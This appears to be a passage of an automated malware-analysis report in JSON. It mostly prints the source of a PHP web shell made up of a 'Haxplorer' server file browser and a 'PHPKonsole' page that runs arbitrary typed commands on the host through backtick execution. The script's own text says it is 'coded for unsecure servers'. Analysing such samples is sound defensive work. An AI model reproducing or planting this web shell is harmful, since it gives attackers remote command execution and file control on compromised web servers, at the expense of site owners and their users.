            " \t\techo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"$lastcmd\\\"><input type=\\\"hidden\\\" name=\\\"dir\\\" value=\\\"$lastdir\\\"><input tabindex=\\\"0\\\" type=\\\"submit\\\" value=\\\"Back to Haxplorer\\\"></form></center>\" ;",
            " \telse {",
            " \t\t$dpos = strrpos($oldfile, \"/\");",
            " \t\tif (strval($dpos)!=\"\") {",
            " \t\t\t$olddir = substr($oldfile, 0, $dpos+1);",
            "   \t\t}",
            " \t\telse {",
            " \t\t\t$olddir = \"$lastdir/\";",
            " \t\t$fpos = strrpos($oldfile, \"/\");",
            " \t\tif (strval($fpos)!=\"\") {",
            " \t\t\t$inputfile = substr($oldfile, $fpos+1);",
            "   \t\t}",
            " \t\telse {",
            "\t \t\t$inputfile = \"\";",
            " \t\t}",
            "       \t\techo \"<center><table><tr><td><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\">\\n\";",
            " \t\techo \"<input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"ren\\\">\\n\";",
            " \t\techo \"<input type=\\\"hidden\\\" name=\\\"oldfile\\\" value=\\\"$oldfile\\\">\\n\";",
            " \t\techo \"<input type=\\\"hidden\\\" name=\\\"olddir\\\" value=\\\"$olddir\\\">\\n\";",
            " \t\techo \"<input type=\\\"hidden\\\" name=\\\"lastcmd\\\" value=\\\"$lastcmd\\\">\\n\";",
            " \t\techo \"<input type=\\\"hidden\\\" name=\\\"lastdir\\\" value=\\\"$lastdir\\\">\\n\";",
            " \t\techo \"Rename \\\"$oldfile\\\" to:<br>\\n\";",
            " \t\techo \"<input size=\\\"100\\\" type=\\\"text\\\" name=\\\"newfile\\\" value=\\\"$inputfile\\\"><br><input type=\\\"submit\\\" value=\\\"Rename\\\">\"; ",
            "\t\techo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"$lastcmd\\\"><input type=\\\"hidden\\\" name=\\\"dir\\\" value=\\\"$lastdir\\\"><input type=\\\"submit\\\" value=\\\"Cancel\\\"></form>\";",
            " \t\techo \"</td></tr></table></center>\";",
            "else if ( $cmd == \"con\") {",
            "<center>",
            "<table>",
            " <tr><td>",
            "<h3>PHPKonsole</h3>",
            "<?php",
            "if (ini_get('register_globals') != '1') {",
            "    if (!empty($HTTP_POST_VARS))",
            "\textract($HTTP_POST_VARS);",
            "    if (!empty($HTTP_GET_VARS))",
            "\textract($HTTP_GET_VARS);",
            "\t      ",
            "    if (!empty($HTTP_SERVER_VARS))",
            "\textract($HTTP_SERVER_VARS);",
            "    }",
            "\t\t    ",
            "    if (!empty($work_dir)) {",
            "\tif (!empty($command)) {",
            "\t    if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {",
            "\t        if ($regs[1][0] == '/') {",
            "\t            $new_dir = $regs[1];",
            "\t\t} else {",
            "\t\t    $new_dir = $work_dir . '/' . $regs[1];",
            "\t\tif (file_exists($new_dir) && is_dir($new_dir)) {",
            "\t\t    $work_dir = $new_dir;",
            "\t\tunset($command);",
            "\t    }",
            "    }",
            "    if (file_exists($work_dir) && is_dir($work_dir)) {",
            "\tchdir($work_dir);",
            "    }",
            "    $work_dir = exec('pwd');",
            "    <form name=\"myform\" action=\"<?php echo \"$PHP_SELF?$urlAdd\" ?>\" method=\"post\">",
            "\t<table border=0 cellspacing=0 cellpadding=0 width=\"100%\"><tr><td>Current working directory: <b>",
            "\t<input type=\"hidden\" name=\"cmd\" value=\"con\">",
            "\t<?php",
            "\t    $work_dir_splitted = explode('/', substr($work_dir, 1));",
            "\t    printf('<a href=\"%s?$urlAddcmd=con&stderr=%s&work_dir=/\">Root</a>/', $PHP_SELF, $stderr);",
            "\t    if (!empty($work_dir_splitted[0])) {",
            "\t\t$path = '';",
            "\t\tfor ($i = 0; $i < count($work_dir_splitted); $i++) {",
            "\t\t    $path .= '/' . $work_dir_splitted[$i];",
            "\t\t    printf('<a href=\"%s?$urlAddcmd=con&stderr=%s&work_dir=%s\">%s</a>/', $PHP_SELF, $stderr, urlencode($path), $work_dir_splitted[$i]);",
            "\t    }",
            "\t?></b></td>",
            "\t<td align=\"right\">Choose new working directory: <select class=\"inputtext\" name=\"work_dir\" onChange=\"this.form.submit()\">",
            "\t<?php",
            "\t$dir_handle = opendir($work_dir);",
            "\twhile ($dir = readdir($dir_handle)) {",
            "\t    if (is_dir($dir)) {",
            "\t\tif ($dir == '.') {",
            "\t\t    echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";",
            "\t\t} elseif ($dir == '..') {",
            "\t\t    if (strlen($work_dir) == 1) {",
            "\t\t    }",
            "\t\t    elseif (strrpos($work_dir, '/') == 0) {",
            "\t\t\techo \"<option value=\\\"/\\\">Parent Directory</option>\\n\";",
            "\t\t    } else {",
            "\t\t\techo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\"), 1)) .\"\\\">Parent Directory</option>\\n\";",
            "\t\t    }",
            "\t\t} else {",
            "\t\t    if ($work_dir == '/') {",
            "\t\t\techo \"<option value=\\\"$work_dir$dir\\\">$dir</option>\\n\";",
            "\t\t    } else {",
            "\t\t\techo \"<option value=\\\"$work_dir/$dir\\\">$dir</option>\\n\";",
            "\t\t    }",
            "\t    }",
            "\tclosedir($dir_handle);",
            "\t</select></td></tr></table>",
            "\t<p>Command: <input class=\"inputtext\" type=\"text\" name=\"command\" size=\"60\">",
            "\t<input name=\"submit_btn\" class=\"inputbutton\" type=\"submit\" value=\"Execute Command\"></p>",
            "\t<p>Enable <code>stderr</code>-trapping? <input type=\"checkbox\" name=\"stderr\"<?php if (($stderr) || (!isset($stderr)) ) echo \" CHECKED\"; ?>></p>",
            "\t<textarea cols=\"80\" rows=\"19\" class=\"inputtextarea\" wrap=off readonly><?php",
            "\t    if (!empty($command)) {",
            "\t        echo \"phpKonsole> \". htmlspecialchars($command) . \"\\n\\n\"; ",
            "\t\tif ($stderr) {",
            "\t\t    $tmpfile = tempnam('/tmp', 'phpshell');",
            "\t\t    $command .= \" 1> $tmpfile 2>&1; \" . \"cat $tmpfile; rm $tmpfile\";",
            "\t\t} else if ($command == 'ls') {",
            "\t\t    $command .= ' -F';",
            "\t\t$output = `$command`;",
            "\t\techo htmlspecialchars($output);",
            "\t    }",
            "\t?></textarea>",
            "    </form>",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t      ",
            "    <script language=\"JavaScript\" type=\"text/javascript\">",
            "\tdocument.forms[0].command.focus();",
            "    </script>",
            " </td></tr></table>",
            "<?php",
            "}    ",
            "else { /* <!-- There is a incorrect or no parameter specified... Let's open the main menu --> */",
            "\t$isMainMenu = true;",
            "     ?>",
            "\t<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">",
            "\t <tr>",
            "\t  <td width=\"100%\" class=\"border\">",
            "\t   <center>&nbsp;-<[{ <?php echo $scriptTitle ?> Main Menu }]>-&nbsp;</center>",
            "\t  </td>",
            "\t </tr>",
            "\t</table>",
            "\t<br>",
            " \t<center>",
            "\t<table border=\"0\" NOWRAP>",
            " \t <tr>",
            "\t  <td valign=\"top\" class=\"silver border\">",
            "           <?php echo buildUrl( sp(2).\"<font color=\\\"navy\\\"><strong>==> Haxplorer <==</strong></font>\", \"cmd=dir&dir=.\").sp(2); ?>",
            "\t  </td>",
            " \t  <td style=\"BORDER-TOP: silver 1px solid;\" width=350 NOWRAP>",
            "\t   Haxplorer is a server side file browser wich (ab)uses the directory object to list",
            " \t   the files and directories stored on a webserver. This handy tools allows you to manage",
            " \t   files and directories on a unsecure server with php support.<br><br>This entire script",
            " \t   is coded for unsecure servers, if your server is secured the script will hide commands",
            " \t   or will even return errors to your browser...<br><br>",
            "\t  </td>",
            "\t </tr>",
            " \t <tr>",
            "\t  <td valign=\"top\" class=\"silver border\">",
            "           <?php echo buildUrl( sp(2).\"<font color=\\\"navy\\\"><strong>==> PHPKonsole <==</strong></font>\", \"cmd=con\").sp(2); ?>",
            "\t  </td>",
            " \t  <td style=\"BORDER-TOP: silver 1px solid;\" width=350 NOWRAP>",
            "\t   <br>PHPKonsole is just a little telnet like shell wich allows you to run commands on the webserver.",
            "\t    When you run commands they will run as the webservers UserID. This should work perfectly",
            "\t    for managing files, like moving, copying etc. If you're using a linux server, system commands",
            "\t    such as ls, mv and cp will be available for you... <br><br>This function will only work if the",
            "\t    server supports php and the execute commands...<br><br>",
            "\t  </td>",
            "\t </tr>",
            "        </table>",
            "\t</center>",
            "\t<br>",
            "     <?php",
            "if ($cmd != \"downl\") {",
            "\tif ( $isMainMenu != true) {",
            " \t\t?>",
            "\t\t<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">",
            "\t\t <tr>",
            "\t\t  <td width=\"100%\" style=\"class=\"silver border\">",
            "\t\t   <center><strong>",
            "\t\t    &nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">[&nbsp;Main Menu&nbsp;]  </font>\", \"cmd=&dir=\");      ?>&nbsp;&nbsp;",
            "\t\t    &nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">[&nbsp;PHPKonsole&nbsp;] </font>\", \"cmd=con\");        ?>&nbsp;&nbsp;",
            "                    &nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">[&nbsp;Haxplorer&nbsp;]  </font>\", \"cmd=dir&dir=.\");  ?> &nbsp;&nbsp;",
            " \t\t   </strong></center>",
            "\t\t  </td>",
            "\t\t </tr>",
            "\t\t</table>",
            "\t\t<br>",
            "\t\t<?php",
            "\t<table width=100% border=\"0\" cellpadding=\"0\" cellspacing=\"0\">",
            "\t <tr>",
            "\t  <td width=\"100%\" class=\"silver border\">",
            "\t   <center>&nbsp;<?php echo $scriptident ?> - <?php echo $scriptver ?> - <?php echo $scriptdate ?>&nbsp;</center>",
            "\t  </td>",
            "\t </tr>",
            "\t</table>",
            " \t   </td>",
            "  </tr>",
            " </table>",
            "  <?php"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.556408",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
